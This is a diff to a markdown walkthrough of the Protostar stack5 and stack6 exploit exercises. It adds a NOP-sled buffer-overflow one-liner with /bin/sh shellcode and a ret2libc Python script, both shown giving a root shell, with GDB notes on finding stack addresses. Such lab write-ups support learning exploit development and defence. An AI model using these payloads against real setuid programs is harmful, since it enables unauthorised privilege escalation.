@@ -34,6 +34,7 @@ Segmentation fault
 
 Lets crack it this time.
 
+
 ### Recon
 
 Lets run it and see what happens.
@@ -468,11 +469,124 @@ ret
  - `.strtab`: string table of `.symtab` section.
 
 
+## Answer stack5
+
+```bash
+user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x00\xf8\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
+# whoami
+root
+
+
+```
+
+
+
+shellcraft onliner payload
+```txt
+\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+
+Reset instruction pointer to the start of main then add our payload shell code and run it.
+
+```bash
+(gdb) break main
+Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.
+(gdb) r
+Starting program: /opt/protostar/bin/stack5 
+
+Breakpoint 1, main (argc=1, argv=0xbffff854) at stack5/stack5.c:10
+10	stack5/stack5.c: No such file or directory.
+	in stack5/stack5.c
+(gdb) x $esp
+0xbffff750:	0xb7fd7ff4
+(gdb) p $esp
+$1 = (void *) 0xbffff750
+
+```
+0xbffff750 -> \x50\xf7\xff\xbf
+
+ **overwrite EIP with 0xbffff750, put the shellcode at the end**
+ *running a program in gdb changes the stack a little, so our address might be off by a few hundred.* 
+ - option1 :So either we can keep trying this with a bunch of different addresses until it works (which is definitely possible if you run a loop), 
+ - option2: or we can extend our margin for error by using no-operations (NOPs)
+   - **NOPs are just single characters (\x90) which tell the computer to skip past them to the next command.** -> This means if we write a bunch of them to memory (a NOP sled) and then write the shellcode after them, we can run the code by hitting any one of the NOPS. 
+   **76 * buffer+ eip_overridden_address + 30*NOPS + shellcode_payload**
+```bash
+      With GDB                          Shellcode (without GDB)
+\   \   \   \   \   \ 
+\      buffer       \ <- 0xbffff750 ->  \   \   \   \   \   \
+\       EIP         \                   \   filled buffer   \
+\    other stuff    \                   \  overwritten EIP  \
+\    GDB stuff      \ <- 0xbffff800 ->  \  NOPS & shellcode \
+\   \   \   \   \   \                   \   \   \   \   \   \
+```   
+   
+   
+   
+```bash
+user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x50\xf7\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
+Segmentation fault
+
+```
+Well gdb isn’t that far out, so we try shifting down the stack (up in address) until we get a hit, we can use jumps of up to 30 bytes as this is the length of our NOP sled.
+loop this until no segmentation error: 
+**76 * buffer+ eip_overridden_address+30 + 30*NOPS + shellcode_payload**
+
+in the end you will get `bffff800`
+```bash
+user@protostar:/opt/protostar/bin$ python -c "import sys;sys.stdout.write('\x90' * 76 + '\x00\xf8\xff\xbf'+ '\x90'*30 +'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80');" | ./stack5
+# whoami
+root
+
+
+```
+\x00\xf8\xff\xbf
+bffff800
+bffff750
+
+## Answer Stack 6
+
+Normal ways wont work here. We need to make our own shellcode to break this.
+exploit struct6.py
+```py
+#!/usr/bin/python
+import struct
+
+### EIP Offset
+padding = "A" * 80
+## padding+= "BBBBCCCCDD" 
+
+### libc system
+system = struct.pack("I", 0xb7ecffb0)
+
+### Return Address After system
+ret = "\x90" * 4
+
+### libc /bin/sh 
+shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)
+print padding + system + ret + shell
+```
+
+
+output
+
+```bash
+user@protostar:/tmp$ (python stack6.py;cat)| /opt/protostar/bin/stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA��췐����c��
+whoami
+root
+
+```
+[Reference:Exploit Exercise | Protostar | Stack 6](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)
+
 
 ## References: Thank you Guys :)  
-[Reference: Practical Reverse Engineering Tutorials Part 2: Protostar Stack4](https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/)
-[References:Exploit Exercise](https://exploit-exercises.lains.space/protostar/stack4/)
-[Reference: Executable and Linkable Format 101 - Part 1 Sections and Segments](https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/)
-[Reference:Hex Calculator](https://www.calculator.net/hex-calculator.html?number1=bffff7ac&c2op=-&number2=bffff760&calctype=op&x=52&y=13)
-[Reference:GDB find command error “warning: Unable to access x bytes of target memory at y, halting search”](https://stackoverflow.com/questions/34819167/gdb-find-command-error-warning-unable-to-access-x-bytes-of-target-memory-at-y)
+
+- [Reference: Exploit-Exercises Protostar Stack 5](https://medium.com/@coturnix97/exploit-exercises-protostar-stack-5-963731ff4b71)
+- [Reference: Practical Reverse Engineering Tutorials Part 2: Protostar Stack4](https://shantanugoel.com/2017/12/04/practical-reverse-engineering-tutorial-2-protostar-stack4/)
+- [References:Exploit Exercise](https://exploit-exercises.lains.space/protostar/stack4/)
+- [Reference: Executable and Linkable Format 101 - Part 1 Sections and Segments](https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/)
+- [Reference:Hex Calculator](https://www.calculator.net/hex-calculator.html?number1=bffff7ac&c2op=-&number2=bffff760&calctype=op&x=52&y=13)
+- [Reference:GDB find command error “warning: Unable to access x bytes of target memory at y, halting search”](https://stackoverflow.com/questions/34819167/gdb-find-command-error-warning-unable-to-access-x-bytes-of-target-memory-at-y)
 
